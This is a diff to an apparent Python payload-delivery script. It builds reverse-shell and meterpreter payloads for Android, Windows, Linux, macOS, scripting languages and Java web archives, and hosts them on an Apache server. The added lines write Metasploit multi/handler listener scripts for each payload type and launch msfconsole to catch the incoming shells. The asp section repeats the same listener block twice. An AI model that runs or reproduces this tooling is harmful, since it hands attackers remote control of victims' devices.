@@ -1,6 +1,5 @@
 #Coded By Mohamed Nour
 
-import sys
 import os
 import sys
 import urllib
@@ -131,6 +130,17 @@ def android():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.apk /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.apk"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD android/meterpreter/reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -156,6 +166,17 @@ def windows():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.exe /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.exe"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD windows/shell/reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -182,6 +203,17 @@ def linux():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.elf /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.elf"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD linux/x86/meterpreter/reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -209,6 +241,17 @@ def mac():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.macho /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.macho"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD osx/x86/shell_reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else :  
 		listen = """
 		use exploit/multi/handler
@@ -237,6 +280,17 @@ def python():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.py /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.py"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD cmd/unix/reverse_python
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else :  
 		listen = """
 		use exploit/multi/handler
@@ -264,6 +318,17 @@ def perl():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.pl /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.pl"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD cmd/unix/reverse_perl
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -291,6 +356,17 @@ def bash():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.sh /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.sh"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD cmd/unix/reverse_bash
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -316,6 +392,28 @@ def asp():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.asp /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.asp"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else :  
 		listen = """
 		use exploit/multi/handler
@@ -341,6 +439,17 @@ def jsp():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.jsp /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.jsp"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD java/jsp_shell_reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else : 
 		listen = """
 		use exploit/multi/handler
@@ -366,6 +475,17 @@ def war():
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.war /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.war"%(lhost,name)
+		listen = """
+		use exploit/multi/handler
+		set PAYLOAD java/jsp_shell_reverse_tcp
+		set LHOST {0}
+		set LPORT {1}
+		exploit
+		""".format(lhost,lport)
+		with open('listener.rc', 'w') as f :
+			f.write(listen)
+		os.system('msfconsole -r listener.rc')
+
 	else :  
 		listen = """
 		use exploit/multi/handler
